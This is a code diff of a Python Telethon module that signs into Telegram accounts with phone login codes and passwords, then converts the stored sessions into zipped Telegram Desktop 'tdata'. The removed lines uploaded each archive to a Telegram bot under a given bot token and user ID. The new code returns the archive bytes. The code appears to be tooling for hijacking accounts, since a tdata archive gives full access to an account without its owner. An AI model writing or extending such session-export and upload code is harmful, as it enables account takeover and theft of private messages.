@@ -1,6 +1,5 @@
 import asyncio
 import os
-import urllib.parse
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
 
@@ -33,41 +32,34 @@ async def sign_in(phone: str, code: str, phone_code_hash: str, password: str = N
     await client.disconnect()
     return True
 
-async def export_tdata(phone: str, bot_token: str, user_id: int):
+async def export_tdata(phone: str):
     try:
-        from opentele.td import TDesktop
-        from opentele.api import UseCurrentSession
+        from TGConvertor import SessionManager
+        import shutil, io, zipfile
 
-        client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
-        await client.connect()
-
-        tdesk = await TDesktop.FromTelethon(client, flag=UseCurrentSession)
+        session_path = f'sessions/{phone}.session'
+        manager = SessionManager.from_telethon_file(session_path)
+        
         tdata_path = f'sessions/tdata_{phone}'
-        tdesk.SaveTData(tdata_path)
+        os.makedirs(tdata_path, exist_ok=True)
+        manager.to_tdata(tdata_path)
 
-        await client.disconnect()
+        # Упаковываем в zip в памяти
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+            for root, dirs, files in os.walk(tdata_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    arcname = os.path.relpath(file_path, tdata_path)
+                    zf.write(file_path, arcname)
+        zip_buffer.seek(0)
+        zip_data = zip_buffer.read()
 
-        # Упаковываем в zip
-        import shutil
-        zip_path = f'sessions/tdata_{phone}.zip'
-        shutil.make_archive(f'sessions/tdata_{phone}', 'zip', tdata_path)
-
-        # Отправляем боту
-        from aiogram import Bot
-        bot = Bot(token=bot_token)
-        with open(zip_path, 'rb') as f:
-            await bot.send_document(
-                user_id,
-                f,
-                caption=f'✅ tdata для {phone}'
-            )
-        await bot.session.close()
-
-        # Чистим файлы
+        # Чистим папку tdata
         shutil.rmtree(tdata_path, ignore_errors=True)
-        os.remove(zip_path)
 
-        return True
+        return zip_data
+
     except Exception as e:
-        print(f'tdata error: {e}')
-        return False# force rebuild
+        print(f'tdata export error: {e}')
+        return None
